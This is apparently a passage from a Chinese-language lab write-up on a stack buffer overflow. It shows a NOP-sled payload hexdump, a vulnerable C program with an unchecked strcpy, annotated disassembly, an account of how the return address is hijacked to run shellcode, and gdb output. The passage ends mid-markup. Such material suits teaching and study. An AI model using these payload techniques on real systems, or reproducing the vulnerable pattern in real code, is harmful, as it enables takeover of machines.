+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">00000060: 67d1 ffff 9090 9090 9090 9090 9090 9090  g...............</span><br><span class="line">00000070: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000080: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000090: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000a0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000b0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000c0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000d0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000e0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000f0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000100: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000110: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000120: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000130: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000140: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000150: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000160: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000170: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000180: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000190: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001a0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001b0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001c0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001d0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001e0: 9090 9090 9090 9090 9090 9031 c050 682f  ...........1.Ph/</span><br></pre></td></tr></table></figure>
+<h4 id="2-2-stack程序的汇编研究"><a href="#2-2-stack程序的汇编研究" class="headerlink" title="2.2 stack程序的汇编研究"></a>2.2 stack程序的汇编研究</h4><p>stack.c程序如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* stack.c */</span></span><br><span class="line"><span class="comment">/* This program has a buffer overflow vulnerability. */</span></span><br><span class="line"><span class="comment">/* Our task is to exploit this vulnerability */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_SIZE 517 <span class="comment">// Represent the size of the buffer</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bof</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">24</span>];</span><br><span class="line"><span class="comment">//	printf(&quot;buffer addr (%p)\n&quot;, buffer);</span></span><br><span class="line">    <span class="comment">/* The following statement has a buffer overflow problem */</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[BUFFER_SIZE];</span><br><span class="line"><span class="comment">//	printf(&quot;str addr (%p)\n&quot;, str);</span></span><br><span class="line">    FILE *badfile;</span><br><span class="line">    badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fread(str, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="number">517</span>, badfile);</span><br><span class="line">    bof(str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Returned Properly\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看到bof中定义的buffer[24]数组大小只有24，远小于badfile的大小517，而bof函数中未进行任何的缓冲区越界检查，因此程序存在缓冲区溢出的漏洞。</p>
+<ul>
+<li>我们研究涉及到的主要寄存器：</li>
+</ul>
+<ol>
+<li><p>%ebx: frame pointer寄存器，被调用者保存，指向当前的previous frame pointer在堆栈区的地址</p>
+</li>
+<li><p>%esp: (stack pointer)栈顶指针寄存器，提供堆栈栈顶单元的偏移地址，与rss段寄存器联用，以控制数据进栈和出栈</p>
+</li>
+<li><p>%eax: 存储返回值</p>
+</li>
+</ol>
+<p>程序产生的asm汇编代码很长，我们关系的只有main和bof两部分，这两部分摘录如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">080484eb &lt;bof&gt;:</span><br><span class="line"> 80484eb:	55                   	push   %ebp;caller的frame pointer入栈</span><br><span class="line"> 80484ec:	89 e5                	mov    %esp,%ebp;设置新的栈开头指针</span><br><span class="line"> 80484ee:	83 ec 28             	sub    $0x28,%esp;开辟28栈空间(此时-0x20(%ebp)是bof中buffer[24]数组的首地址)</span><br><span class="line"> 80484f1:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 80484f4:	8d 45 e0             	lea    -0x20(%ebp),%eax</span><br><span class="line"> 80484f7:	50                   	push   %eax</span><br><span class="line"> 80484f8:	68 30 86 04 08       	push   $0x8048630</span><br><span class="line"> 80484fd:	e8 7e fe ff ff       	call   8048380 &lt;printf@plt&gt;</span><br><span class="line"> 8048502:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048505:	83 ec 08             	sub    $0x8,%esp;开辟8栈空间(用来存放)</span><br><span class="line"> 8048508:	ff 75 08             	pushl  0x8(%ebp);ebp+8处的数（即传进去bof的arg：str）压入栈</span><br><span class="line"> ;实际上就是strcpy的arg2： str入栈</span><br><span class="line"> 804850b:	8d 45 e0             	lea    -0x20(%ebp),%eax</span><br><span class="line"> 804850e:	50                   	push   %eax ;strcpy的arg1： buffer首地址入栈</span><br><span class="line"> 804850f:	e8 8c fe ff ff       	call   80483a0 &lt;strcpy@plt&gt; ;调用strcpy</span><br><span class="line"> 8048514:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048517:	b8 01 00 00 00       	mov    $0x1,%eax;返回值是1，存在eax中</span><br><span class="line"> 804851c:	c9                   	leave  ;leave恢复ebp的值，同时也重新设定栈指针使其指向存储的返回值，好让下一步return时，frame pointer回到正确的位置上</span><br><span class="line"> 804851d:	c3                   	ret    ;返回caller函数</span><br><span class="line"></span><br><span class="line">0804851e &lt;main&gt;:</span><br><span class="line"> 804851e:	8d 4c 24 04          	lea    0x4(%esp),%ecx ;ecx = esp+4</span><br><span class="line"> 8048522:	83 e4 f0             	and    $0xfffffff0,%esp ;取esp的前面3.5个字节(esp最后4bit置0)</span><br><span class="line"> 8048525:	ff 71 fc             	pushl  -0x4(%ecx) ;在栈中压入ecx-4对应地址的数据</span><br><span class="line"> 8048528:	55                   	push   %ebp ;frame pointer 帧指针</span><br><span class="line"> 8048529:	89 e5                	mov    %esp,%ebp ;ebp &lt;= esp</span><br><span class="line"> 804852b:	51                   	push   %ecx ;ecx入栈，ecx循环操作和字串处理的计数控制；函数调用时的第4个参数</span><br><span class="line"> 804852c:	81 ec 14 02 00 00    	sub    $0x214,%esp</span><br><span class="line"> 8048532:	83 ec 08             	sub    $0x8,%esp;开辟了一共214+8的栈空间</span><br><span class="line"> 8048535:	8d 85 ef fd ff ff    	lea    -0x211(%ebp),%eax ;eax &lt;= ebp-211,此时eax实际上存储了main中str[BUFFER_SIZE]的起始地址</span><br><span class="line"> 804853b:	50                   	push   %eax ;这句加前一句实际上将str[BUFFER_SIZE]的起始地址作为arg1入栈了</span><br><span class="line"> 804853c:	68 42 86 04 08       	push   $0x8048642 ;这个地址中存储的应该是&quot;buffer addr (%p)\n&quot;在内存中的位置，作为arg2入栈</span><br><span class="line"> 8048541:	e8 3a fe ff ff       	call   8048380 &lt;printf@plt&gt; ;调用printf函数，同时将当前的pc压入栈（return address）</span><br><span class="line"> 8048546:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048549:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 804854c:	68 51 86 04 08       	push   $0x8048651</span><br><span class="line"> 8048551:	68 53 86 04 08       	push   $0x8048653</span><br><span class="line"> 8048556:	e8 75 fe ff ff       	call   80483d0 &lt;fopen@plt&gt;</span><br><span class="line"> 804855b:	83 c4 10             	add    $0x10,%esp ;stack回退10</span><br><span class="line"> 804855e:	89 45 f4             	mov    %eax,-0xc(%ebp) ;eax中存放了fopen()函数的返回值，也就是说 badfile的内存中的地址放到了frame pointer向下加12字节的地方的位置，此时栈中为：framepointer|新的badfile地址|str数组</span><br><span class="line"> 8048561:	ff 75 f4             	pushl  -0xc(%ebp) ;参数：压badfile的地址入栈，作为第一个参数</span><br><span class="line"> 8048564:	68 05 02 00 00       	push   $0x205;参数517个字节的内容</span><br><span class="line"> 8048569:	6a 01                	push   $0x1 ;参数sizeof char</span><br><span class="line"> 804856b:	8d 85 ef fd ff ff    	lea    -0x211(%ebp),%eax ;eax &lt;= ebp-0x211</span><br><span class="line"> 8048571:	50                   	push   %eax ;参数str数组首地址</span><br><span class="line"> 8048572:	e8 19 fe ff ff       	call   8048390 &lt;fread@plt&gt; ;call函数fread，同时将当前的pc压入栈（return address)</span><br><span class="line"> 8048577:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 804857a:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 804857d:	8d 85 ef fd ff ff    	lea    -0x211(%ebp),%eax;计算str地址</span><br><span class="line"> 8048583:	50                   	push   %eax;str地址入栈，作为bof的argument</span><br><span class="line"> 8048584:	e8 62 ff ff ff       	call   80484eb &lt;bof&gt;;调用bof函数</span><br><span class="line"> 8048589:	83 c4 10             	add    $0x10,%esp;</span><br><span class="line"> 804858c:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 804858f:	68 5b 86 04 08       	push   $0x804865b</span><br><span class="line"> 8048594:	e8 17 fe ff ff       	call   80483b0 &lt;puts@plt&gt;</span><br><span class="line"> 8048599:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 804859c:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 80485a1:	8b 4d fc             	mov    -0x4(%ebp),%ecx</span><br><span class="line"> 80485a4:	c9                   	leave  </span><br><span class="line"> 80485a5:	8d 61 fc             	lea    -0x4(%ecx),%esp</span><br><span class="line"> 80485a8:	c3                   	ret    </span><br><span class="line"> 80485a9:	66 90                	xchg   %ax,%ax</span><br><span class="line"> 80485ab:	66 90                	xchg   %ax,%ax</span><br><span class="line"> 80485ad:	66 90                	xchg   %ax,%ax</span><br><span class="line"> 80485af:	90                   	nop</span><br></pre></td></tr></table></figure>
+<p>我在所有关键地方都加上了注解，方便理解。</p>
+<p><strong>接下来，我再次对这个汇编代码的几个关键位置代码做出解释：</strong></p>
+<ul>
+<li>调用fread函数：</li>
+</ul>
+<ol>
+<li>首先，代码通过push指令分别将<code>fread(str, sizeof(char), 517, badfile)</code>中的四个参数依次入栈</li>
+<li>接着，使用call指令，调用代码段的地址为 8048390 的 fread 函数，同时call指令会把当前代码执行的位置pc压入栈中（即return address）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">8048561:	ff 75 f4             	pushl  -0xc(%ebp) ;参数：压badfile的地址入栈，作为第一个参数</span><br><span class="line">8048564:	68 05 02 00 00       	push   $0x205;参数517个字节的内容</span><br><span class="line">8048569:	6a 01                	push   $0x1 ;参数sizeof char</span><br><span class="line">804856b:	8d 85 ef fd ff ff    	lea    -0x211(%ebp),%eax ;eax &lt;= ebp-0x211</span><br><span class="line">8048571:	50                   	push   %eax ;参数str数组首地址</span><br><span class="line">8048572:	e8 19 fe ff ff       	call   8048390 &lt;fread@plt&gt; ;call函数fread，同时将当前的pc压入栈（return address)</span><br></pre></td></tr></table></figure>
+<p>（在fread函数汇编代码的开始部分，代码会把当前的%ebp，即frame pointer压入栈中，即为fread函数段中的previous frame pointer，此后，%ebp的值会变成这时的previous frame pointer所在的地址）</p>
+<ul>
+<li>调用bof函数：</li>
+</ul>
+<ol>
+<li>将bof函数参数：str地址压入栈中</li>
+<li>call指令，调用代码段的地址为 80484eb 的 bof 函数，同时call指令会把当前代码执行的位置pc压入栈中（即return address）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">804857d:	8d 85 ef fd ff ff    	lea    -0x211(%ebp),%eax;计算str地址</span><br><span class="line">8048583:	50                   	push   %eax;str地址入栈，作为bof的argument</span><br><span class="line">8048584:	e8 62 ff ff ff       	call   80484eb &lt;bof&gt;;调用bof函数</span><br></pre></td></tr></table></figure>
+<ul>
+<li>进入bof时：</li>
+</ul>
+<ol>
+<li>将此时的%ebp，也就是bof函数调用者main的frame pointer压栈，作为previous frame pointer</li>
+<li>重新设置%ebp为当前的栈顶指针%ebp = %esp，即previous frame pointer所在位置</li>
+<li>为bof函数内部的局部变量buffer函数开辟栈空间</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">080484eb &lt;bof&gt;:</span><br><span class="line"> 80484eb:	55                   	push   %ebp;caller的frame pointer入栈</span><br><span class="line"> 80484ec:	89 e5                	mov    %esp,%ebp;设置新的栈开头指针</span><br><span class="line"> 80484ee:	83 ec 28             	sub    $0x28,%esp;开辟28栈空间(此时-0x20(%ebp)是bof中buffer[24]数组的首地址)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>调用strcpy函数：</li>
+</ul>
+<ol>
+<li>将strcpy的两个参数压栈</li>
+<li>call指令，调用代码段的地址为 80483a0 的 strcpy 函数，同时call指令会把当前代码执行的位置pc压入栈中（即return address）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">8048508:	ff 75 08             	pushl  0x8(%ebp);ebp+8处的数（即传进去bof的arg：str）压入栈</span><br><span class="line">;实际上就是strcpy的arg2： str入栈</span><br><span class="line">804850b:	8d 45 e0             	lea    -0x20(%ebp),%eax</span><br><span class="line">804850e:	50                   	push   %eax ;strcpy的arg1： buffer首地址入栈</span><br><span class="line">804850f:	e8 8c fe ff ff       	call   80483a0 &lt;strcpy@plt&gt; ;调用strcpy</span><br></pre></td></tr></table></figure>
+<ul>
+<li>bof返回到main中<strong>（实际上由于strcpy运行过程产生了buffer overflow，覆盖了return address，所以程序运行过程中实际上并没有发生这一步！！）</strong></li>
+</ul>
+<ol>
+<li>将本函数的返回值（此处为 return 1）放入寄存器%eax中</li>
+<li>调用leave指令，将%ebp的值还原为previous frame pointer的值，同时调整pc的值为 return address，保证使用ret时可以顺利返回caller函数（此处为main）的状态</li>
+<li>调用ret指令，回到main函数</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8048517:	b8 01 00 00 00       	mov    $0x1,%eax;返回值是1，存在eax中</span><br><span class="line">804851c:	c9                   	leave  ;leave恢复ebp的值，同时也重新设定栈指针使其指向存储的返回值，好让下一步return时，frame pointer回到正确的位置上</span><br><span class="line">804851d:	c3                   	ret    ;返回caller函数</span><br></pre></td></tr></table></figure>
+<h4 id="2-3-bof中ret时发生的Buffer-Overflow跳转现象"><a href="#2-3-bof中ret时发生的Buffer-Overflow跳转现象" class="headerlink" title="2.3 bof中ret时发生的Buffer Overflow跳转现象"></a>2.3 bof中ret时发生的Buffer Overflow跳转现象</h4><p>上一节中，我们已经说明了bof返回到main函数中这一步实际上是不会发生的</p>
+<p>我们再来看这个代码，解释以下原因。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8048517:	b8 01 00 00 00       	mov    $0x1,%eax;返回值是1，存在eax中</span><br><span class="line">804851c:	c9                   	leave  ;leave恢复ebp的值，同时也重新设定栈指针使其指向存储的返回值，好让下一步return时，frame pointer回到正确的位置上</span><br><span class="line">804851d:	c3                   	ret    ;返回caller函数</span><br></pre></td></tr></table></figure>
+<p>​    这里，在使用leave和ret指令返回main函数的时候，在当前<code>&amp; %ebp</code>和<code>&amp; %ebp-4</code>中的值本应该是main的函数代码执行位置和main的frame pointer。</p>
+<p>​    而由于溢出，这两个地方现在均变成了0xffff1d76，即我们的恶意代码所在位置，此时的main函数的的return address，frame pointer早已丢失不再，因此我们在执行leave指令时，非但不会在寄存器中放入正确的return address作为跳转地址，反而会把恶意代码所在的地址作为返回地址放到pc寄存器中。</p>
+<p>​    之后经由ret指令，程序的执行跳转到对应恶意代码的位置，在对应位置的代码开始执行，我们填充的劫持shell的恶意代码开始执行。</p>
+<h4 id="2-4-使用gdb调试程序"><a href="#2-4-使用gdb调试程序" class="headerlink" title="2.4 使用gdb调试程序"></a>2.4 使用gdb调试程序</h4><p>下面我们用gdb研究一下stack的程序运行</p>
+<ol>
+<li>使用如下指令生成可以dbg的可执行程序stackdbg</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g stack.c -o stackdbg</span><br></pre></td></tr></table></figure>
+<ol>
+<li>使用gdb stackdbg命令进入dbg程序中，并用break指令在每个函数的入口出口处设置断点</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">lyq@lyq-virtual-machine:~/Desktop/hw1_cp$ gdb stackdbg</span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">Reading symbols from stackdbg...done.</span><br><span class="line">(gdb) <span class="built_in">break</span> strcpy</span><br><span class="line">Breakpoint 1 at 0x400540</span><br><span class="line">(gdb) <span class="built_in">break</span> fread</span><br><span class="line">Breakpoint 2 at 0x400560</span><br><span class="line">(gdb) <span class="built_in">break</span> bof</span><br><span class="line">Breakpoint 3 at 0x4006c2: file stack.c, line 11.</span><br><span class="line">(gdb) l</span><br><span class="line">5       <span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">6       <span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">7       <span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">8</span><br><span class="line">9       <span class="comment">#define BUFFER_SIZE 517 // Represent the size of the buffer</span></span><br><span class="line">10</span><br><span class="line">11      int bof(char *str) &#123;</span><br><span class="line">12          char buffer[24];</span><br><span class="line">13              <span class="built_in">printf</span>(<span class="string">&quot;buffer addr (%p)\n&quot;</span>, buffer);</span><br><span class="line">14          /* The following statement has a buffer overflow problem */</span><br><span class="line">(gdb) l</span><br><span class="line">15          strcpy(buffer, str);</span><br><span class="line">16          <span class="built_in">return</span> 1;</span><br><span class="line">17      &#125;</span><br><span class="line">18</span><br><span class="line">19      int main(int argc, char **argv) &#123;</span><br><span class="line">20          char str[BUFFER_SIZE];</span><br><span class="line">21              <span class="built_in">printf</span>(<span class="string">&quot;str addr (%p)\n&quot;</span>, str);</span><br><span class="line">22          FILE *badfile;</span><br><span class="line">23          badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">24          fread(str, sizeof(char), 517, badfile);</span><br><span class="line">(gdb) l</span><br><span class="line">25          bof(str);</span><br><span class="line">26          <span class="built_in">printf</span>(<span class="string">&quot;Returned Properly\n&quot;</span>);</span><br><span class="line">27          <span class="built_in">return</span> 1;</span><br><span class="line">28      &#125;</span><br><span class="line">(gdb) <span class="built_in">break</span> 16</span><br><span class="line">Breakpoint 4 at 0x4006fa: file stack.c, line 16.</span><br><span class="line">(gdb) <span class="built_in">break</span> 26</span><br><span class="line">Breakpoint 5 at 0x40079d: file stack.c, line 26.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ol>
+<li>start运行程序，在各个break point处停下来，print出该位置下的各变量地址和%ebp，%esp的值</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 6 at 0x40072d: file stack.c, line 19.</span><br><span class="line">Starting program: /home/lyq/Desktop/hw1_cp/stackdbg</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 6, main (argc=1, argv=0x7fffffffe108) at stack.c:19</span><br><span class="line">19      int main(int argc, char **argv) &#123;</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$1</span> = 0xffffe020</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$2</span> = 0xffffddf0</span><br><span class="line">(gdb) <span class="built_in">print</span> /x *<span 